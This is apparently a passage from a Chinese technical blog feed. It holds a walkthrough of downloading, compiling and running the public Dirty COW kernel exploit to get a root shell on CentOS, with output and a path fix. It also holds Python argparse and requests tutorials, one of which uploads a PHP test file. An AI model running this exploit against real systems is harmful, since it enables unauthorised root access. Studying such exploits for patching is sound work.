      <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[centos@bogon ~]$ uname -a</span><br><span class="line">Linux bogon 3.10.0-327.el7.x86_64 #1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[centos@bogon ~]$ wget https://gist.githubusercontent.com/scumjr/17d91f20f73157c722ba2aea702985d2/raw/a37178567ca7b816a5c6f891080770feca5c74d7/dirtycow-mem.c</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>会有几个警告<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[centos@bogon ~]$ gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread</span><br><span class="line">dirtycow-mem.c: In function ‘get_range’:</span><br><span class="line">dirtycow-mem.c:139:3: warning: use of assignment suppression and length modifier together in gnu_scanf format [-Wformat=]</span><br><span class="line">   sscanf(line, &quot;%lx-%lx %s %*Lx %*x:%*x %*Lu %s&quot;, start, end, flags, filename);</span><br><span class="line">   ^</span><br><span class="line">dirtycow-mem.c:139:3: warning: use of assignment suppression and length modifier together in gnu_scanf format [-Wformat=]</span><br><span class="line">[centos@bogon ~]$ ls</span><br><span class="line">Desktop       dirtycow-mem.c  Downloads  Pictures  Templates</span><br><span class="line">dirtycow-mem  Documents       Music      Public    Videos</span><br></pre></td></tr></table></figure></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[centos@bogon ~]$ chmod 777 dirtycow-mem</span><br><span class="line">[centos@bogon ~]$ ./dirtycow-mem</span><br><span class="line">[*] range: 7ff3e2c78000-7ff3e2e2e000]</span><br><span class="line">[*] getuid = 7ff3e2d362e0</span><br><span class="line">[*] mmap 0x7ff3e2a75000</span><br><span class="line">[*] exploiting (patch)</span><br><span class="line">[*] patched (procselfmemThread)</span><br><span class="line">[*] patched (madviseThread)</span><br><span class="line">[root@bogon centos]# [*] exploiting (unpatch)</span><br><span class="line">[*] unpatched: uid=1000 (procselfmemThread)</span><br><span class="line">[*] unpatched: uid=1000 (madviseThread)</span><br><span class="line">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">[root@bogon centos]# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><p>记得执行否则可能死掉（阿里云直接死机，腾讯云返回原来的shell）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br></pre></td></tr></table></figure></p><p>centos7报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[centos@bogon ~]$ ./dirtycow-mem</span><br><span class="line">[*] range: 7f3944286000-7f394443c000]</span><br><span class="line">[*] getuid = 7f39443442e0</span><br><span class="line">dirtycow-mem: open(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;): No such file or directory</span><br></pre></td></tr></table></figure></p><p>修改dirtycow-mem.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define LIBC_PATH   &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define LIBC_PATH   &quot;/usr/lib64/libc.so.6&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> Dirtycow 提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>argparse</title>
      <link href="/2016/08/01/python/argparse/"/>
      <url>/2016/08/01/python/argparse/</url>
      <content type="html"><![CDATA[<p>apgparse 获取参数</p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MY_Argparse</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[],</span></span><br><span class="line">    <span class="comment">#     formatter_class=argparse.HelpFormatter, prefix_chars='-', fromfile_prefix_chars=None,</span></span><br><span class="line">    <span class="comment">#         argument_default=None, conflict_handler='error', add_help=True)</span></span><br><span class="line">    parser = argparse.ArgumentParser(usage=<span class="string">"%(prog)s [options]"</span>,add_help=<span class="keyword">False</span>,</span><br><span class="line">    <span class="comment"># add_argument (name or flags...[, action][, nargs][, const][, default][, type]</span></span><br><span class="line">    <span class="comment">#       [, choices][, required][, help][, metavar][, dest])</span></span><br><span class="line">    formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">    description=(<span class="string">'''</span></span><br><span class="line"><span class="string">        Please do not mess up this text!</span></span><br><span class="line"><span class="string">        --------------------------------</span></span><br><span class="line"><span class="string">            I have indented it</span></span><br><span class="line"><span class="string">            exactly the way</span></span><br><span class="line"><span class="string">            I want it'''</span>))</span><br><span class="line">    other = parser.add_argument_group(<span class="string">'Other arguments'</span>)</span><br><span class="line">    other.add_argument(<span class="string">'-h'</span>, <span class="string">'--help'</span>, action=<span class="string">"store_true"</span>, help=<span class="string">'help of the %(prog)s program'</span>)</span><br><span class="line">    other.add_argument(<span class="string">'--version'</span>, action=<span class="string">'version'</span>, version=<span class="string">'%(prog)s 1.0'</span>)</span><br><span class="line"><span class="comment">#     example = parser.add_argument_group('example', 'example description')</span></span><br><span class="line"><span class="comment">#     parser.add_argument(</span></span><br><span class="line"><span class="comment">#         '-f', '--foo',</span></span><br><span class="line"><span class="comment">#         nargs='*',</span></span><br><span class="line"><span class="comment">#         metavar='filename',</span></span><br><span class="line"><span class="comment">#         required=True,</span></span><br><span class="line"><span class="comment">#         default="hahaha",</span></span><br><span class="line"><span class="comment">#         dest='foodest',</span></span><br><span class="line"><span class="comment">#         type=str,</span></span><br><span class="line"><span class="comment">#         help='foo of the %(prog)s program'</span></span><br><span class="line"><span class="comment">#         )</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     optional.add_argument('--file', type=argparse.FileType('w'))</span></span><br><span class="line"><span class="comment">#     optional.add_argument('--choices', type=int, choices=range(1, 4))</span></span><br><span class="line">    optional = parser.add_argument_group(<span class="string">'optional arguments'</span>)</span><br><span class="line"></span><br><span class="line">    args=parser.parse_args()</span><br><span class="line">    args = vars(args)</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'help'</span>]:</span><br><span class="line">        parser.print_help()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line">Args = MY_Argparse()</span><br><span class="line"><span class="keyword">print</span> Args</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python MY_Argparse.py</span><br><span class="line">-----------------------------------</span><br><span class="line">&#123;<span class="string">'help'</span>: <span class="keyword">False</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">python MY_Argparse.py -h</span><br><span class="line">-----------------------------------</span><br><span class="line">usage: MY_Argparse.py [options]</span><br><span class="line"></span><br><span class="line">        Please do not mess up this text!</span><br><span class="line">        --------------------------------</span><br><span class="line">            I have indented it</span><br><span class="line">            exactly the way</span><br><span class="line">            I want it</span><br><span class="line"></span><br><span class="line">Other arguments:</span><br><span class="line">  -h, --help  help of the MY_Argparse.py program</span><br><span class="line">  --version   show program&apos;s version number and exit</span><br><span class="line">&#123;&apos;help&apos;: True&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python MY_Argparse.py --version</span><br><span class="line">-----------------------------------</span><br><span class="line">MY_Argparse.py 1.0</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> python </category>
          
          <category> 模块 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
            <tag> apgparse </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>requests</title>
      <link href="/2016/08/01/python/requests/"/>
      <url>/2016/08/01/python/requests/</url>
      <content type="html"><![CDATA[<h2 id="默认请求头"><a href="#默认请求头" class="headerlink" title="默认请求头"></a>默认请求头</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.10.0</span><br></pre></td></tr></table></figure><h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><h3 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(url)</span><br></pre></td></tr></table></figure><h3 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.post(url)</span><br></pre></td></tr></table></figure><h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = requests.put(url)</span><br><span class="line">r = requests.delete(url)</span><br><span class="line">r = requests.head(url)</span><br><span class="line">r = requests.options(url)</span><br></pre></td></tr></table></figure><h3 id="将请求方法放在参数中"><a href="#将请求方法放在参数中" class="headerlink" title="将请求方法放在参数中"></a>将请求方法放在参数中</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.request(<span class="string">'GET'</span>, url)</span><br></pre></td></tr></table></figure><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><h3 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</span><br><span class="line">r = requests.get(url, params=payload)</span><br></pre></td></tr></table></figure><h3 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a>POST传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</span><br><span class="line">r = requests.post(url, data=payload)</span><br></pre></td></tr></table></figure><h3 id="JSON传参"><a href="#JSON传参" class="headerlink" title="JSON传参"></a>JSON传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line">r = requests.post(url, data=json.dumps(payload))</span><br></pre></td></tr></table></figure><h2 id="设置cookie"><a href="#设置cookie" class="headerlink" title="设置cookie"></a>设置cookie</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="设置Headers"><a href="#设置Headers" class="headerlink" title="设置Headers"></a>设置Headers</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, data=json.dumps(payload), headers=headers)</span><br></pre></td></tr></table></figure><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><h3 id="直接写入"><a href="#直接写入" class="headerlink" title="直接写入"></a>直接写入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = &#123;<span class="string">"file"</span>: (<span class="string">"upload.php"</span>,<span class="string">"&lt;?php phpinfo() ?&gt;"</span>)&#125;</span><br><span class="line">r = requests.post(url, files=f)</span><br></pre></td></tr></table></figure><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>{‘name’: file-like-objects}<br>{‘name’: (‘filename’, fileobj)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br></pre></td></tr></table></figure><p>也可以明确设置filename, content_type and headers<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;<span class="string">'file'</span>: (<span class="string">'report.xls'</span>, open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>),</span><br><span class="line"><span class="string">'application/vnd.ms-excel'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br></pre></td></tr></table></figure></p><h3 id="上传多个文件"><a href="#上传多个文件" class="headerlink" title="上传多个文件"></a>上传多个文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">multiple_files = [(<span class="string">'images'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'foo.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>)),</span><br><span class="line">                      (<span class="string">'images'</span>, (<span class="string">'bar.png'</span>, open(<span class="string">'bar.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>))]</span><br><span class="line">r = requests.post(url, files=multiple_files)</span><br></pre></td></tr></table></figure><h3 id="流上传"><a href="#流上传" class="headerlink" title="流上传"></a>流上传</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'massive-body'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    requests.post(url, data=f)</span><br></pre></td></tr></table></figure><h2 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">r.status_code</span><br><span class="line"><span class="comment"># 200</span></span><br><span class="line">r.headers[<span class="string">'content-type'</span>]</span><br><span class="line"><span class="comment"># 'application/json; charset=utf8'</span></span><br><span class="line">r.encoding</span><br><span class="line"><span class="comment"># 'utf-8'</span></span><br><span class="line">r.text</span><br><span class="line"><span class="comment"># u'&#123;"type":"User"...'</span></span><br><span class="line">r.json()</span><br><span class="line"><span class="comment"># &#123;u'private_gists': 419, u'total_private_repos': 77, ...&#125;</span></span><br><span class="line">r.url</span><br><span class="line"><span class="comment"># http://httpbin.org/get?key2=value2&amp;key1=value1</span></span><br><span class="line">r.text</span><br><span class="line"><span class="comment"># u'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></span><br><span class="line">r.encoding</span><br><span class="line"><span class="comment"># 'utf-8'</span></span><br><span class="line">r.encoding = <span class="string">'ISO-8859-1'</span></span><br><span class="line">r.status_code</span><br><span class="line"><span class="comment"># 200</span></span><br><span class="line">r.headers[<span class="string">'content-type'</span>]</span><br><span class="line"><span class="comment"># 'application/json; charset=utf8'</span></span><br><span class="line">r.encoding</span><br><span class="line"><span class="comment"># 'utf-8'</span></span><br><span class="line">r.text</span><br><span class="line"><span class="comment"># u'&#123;"type":"User"...'</span></span><br><span class="line">r.json()</span><br><span class="line"><span class="comment"># &#123;u'private_gists': 419, u'total_private_repos': 77, ...&#125;</span></span><br><span class="line">r.contentr.content</span><br><span class="line"><span class="comment"># b'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></span><br><span class="line">r.cookies</span><br></pre></td></tr></table></figure><h3 id="返回体"><a href="#返回体" class="headerlink" title="返回体"></a>返回体</h3><p>获取unicode字符串，会自动根据响应头部的字符编码(r.encoding)进行解码，当然也可以自己设定r.encoding<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">u'&#123;"message":"Hello there, wayfaring stranger...</span></span><br></pre></td></tr></table></figure></p><p>获取bytes字符串，会自动解码gzip和deflate数据<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.content</span><br><span class="line"><span class="string">'&#123;"message":"Hello there, wayfaring stranger. ..</span></span><br></pre></td></tr></table></figure></p><p>要存储web图片，可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>i = Image.open(StringIO(r.content))</span><br></pre></td></tr></table></figure></p><p>可以解码json对象<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</span><br><span class="line">&#123;<span class="string">u'documentation_url'</span>: <span class="string">u'https://developer...</span></span><br></pre></td></tr></table></figure></p><p>返回raw response，需要在requests请求中将stream设为True<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>, stream=<span class="keyword">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw</span><br><span class="line">&lt;requests.packages.urllib3.response.HTTPResponse object at <span class="number">0x101194810</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw.read(<span class="number">10</span>)</span><br><span class="line"><span class="string">'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'</span></span><br></pre></td></tr></table></figure></p><p>如果不想一次性处理全部的数据，可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tarball_url = <span class="string">'https://github.com/kennethreitz/requests/tarball/master'</span></span><br><span class="line">r = requests.get(tarball_url, stream=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">if</span> int(r.headers[<span class="string">'content-length'</span>]) &lt; TOO_LONG:</span><br><span class="line">  content = r.content</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p><p>也可以迭代的处理数据<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size):</span><br><span class="line">        fd.write(chunk)</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">'http://httpbin.org/stream/20'</span>, stream=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> r.iter_lines():</span><br><span class="line">    <span class="comment"># filter out keep-alive new lines</span></span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        print(json.loads(line))</span><br></pre></td></tr></table></figure></p><h3 id="获取响应代码"><a href="#获取响应代码" class="headerlink" title="获取响应代码"></a>获取响应代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><h3 id="获取响应headers"><a href="#获取响应headers" class="headerlink" title="获取响应headers"></a>获取响应headers</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">'content-encoding'</span>: <span class="string">'gzip'</span>,</span><br><span class="line">  <span class="string">'transfer-encoding'</span>: <span class="string">'chunked'</span>,</span><br><span class="line">  <span class="string">'connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">  <span class="string">'server'</span>: <span class="string">'nginx/1.0.4'</span>,</span><br><span class="line">  <span class="string">'x-runtime'</span>: <span class="string">'148ms'</span>,</span><br><span class="line">  <span class="string">'etag'</span>: <span class="string">'"e1ca502697e5c9317743dc078f67693f"'</span>,</span><br><span class="line">  <span class="string">'content-type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取发送的headers"><a href="#获取发送的headers" class="headerlink" title="获取发送的headers"></a>获取发送的headers</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.request.headers</span><br><span class="line">&#123;<span class="string">'Accept-Encoding'</span>: <span class="string">'identity, deflate, compress, gzip'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>, <span class="string">'User-Agent'</span>: <span class="string">'python-requests/1.2.0'</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>获取cookie，返回CookieJar对象<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies</span><br></pre></td></tr></table></figure></p><h4 id="将CookieJar转为字典"><a href="#将CookieJar转为字典" class="headerlink" title="将CookieJar转为字典"></a>将CookieJar转为字典</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">&#123;<span class="string">'BAIDUID'</span>: <span class="string">'84722199DF8EDC372D549EC56CA1A0E2:FG=1'</span>, <span class="string">'BD_HOME'</span>: <span class="string">'0'</span>, <span class="string">'BDSVRTM'</span>: <span class="string">'0'</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="将字典转为CookieJar"><a href="#将字典转为CookieJar" class="headerlink" title="将字典转为CookieJar"></a>将字典转为CookieJar</h4><figure class="highlight 